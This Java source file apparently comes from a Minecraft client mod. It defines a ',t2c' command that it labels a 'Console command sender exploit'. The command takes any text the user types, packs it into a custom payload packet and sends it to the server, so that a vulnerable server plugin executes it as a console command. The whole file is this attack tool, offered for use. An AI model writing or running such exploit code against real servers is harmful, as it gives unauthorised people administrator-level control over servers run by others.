package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import io.github.spigotrce.paradiseclientfabric.packet.T2CPayloadPacket;

public class T2CCommand extends Command {
    private static final String COMMAND_NAME = "t2c";
    private static final String DESCRIPTION = "Console command sender exploit";
    private static final String COMMAND_ARG = "command";
    
    public T2CCommand(MinecraftClient mc) {
        super(COMMAND_NAME, DESCRIPTION, mc);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
            .executes(this::showUsage)
            .then(argument(COMMAND_ARG, StringArgumentType.greedyString())
                .executes(this::executeCommand));
    }

    private int executeCommand(CommandContext<CommandSource> context) {
        try {
            String command = context.getArgument(COMMAND_ARG, String.class);
            CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new T2CPayloadPacket(command));
            Helper.sendPacket(packet);
            Helper.printChatMessage("§aPayload sent successfully!");
            return 1;
        } catch (Exception e) {
            Helper.printChatMessage("§cFailed to send payload: " + e.getMessage());
            return -1;
        }
    }

    private int showUsage(CommandContext<CommandSource> context) {
        Helper.printChatMessage("§6Usage: ," + COMMAND_NAME + " <command>");
        Helper.printChatMessage("§7" + DESCRIPTION);
        return 1;
    }
                                   }
